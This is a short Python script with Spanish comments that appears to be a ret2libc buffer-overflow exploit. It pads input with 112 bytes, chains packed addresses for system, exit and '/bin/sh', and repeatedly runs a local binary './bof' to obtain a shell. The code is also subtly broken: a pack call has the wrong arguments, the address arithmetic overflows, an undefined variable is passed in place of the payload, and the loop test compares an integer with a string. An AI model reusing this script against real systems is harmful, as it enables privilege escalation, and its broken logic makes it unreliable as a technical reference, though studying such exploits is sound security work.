#!/usr/bin/python3

from struct import pack
import pdb, signal
import time, sys, os
from subprocess import call

def def_handler(sig,frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# ctrl + c
signal.signal(signal.SIGINT, def_handler)

# Variables globales:
junk = b"A"*112

# system -> 0xf7e03040
# exit -> 0xf7df5990
# sh -> 0xf7f49338

base_libc = 0xb761d000


system = 0xf7e03040
exit = 0xf7df5990
sh = 0x00162bac

system_addr = pack("<L", base_libc + system)
exit_addr = pack("<L", base_libc + exit)
sh_addr = pack("<L", base_libc, sh)

payload = junk + system_addr + exit_addr + sh_addr

if __name__ == "__main__":

    
    while os.system("echo $0") != "/bin/sh":
        response = call(["./bof", bof])

    else:
        sys.exit(1)
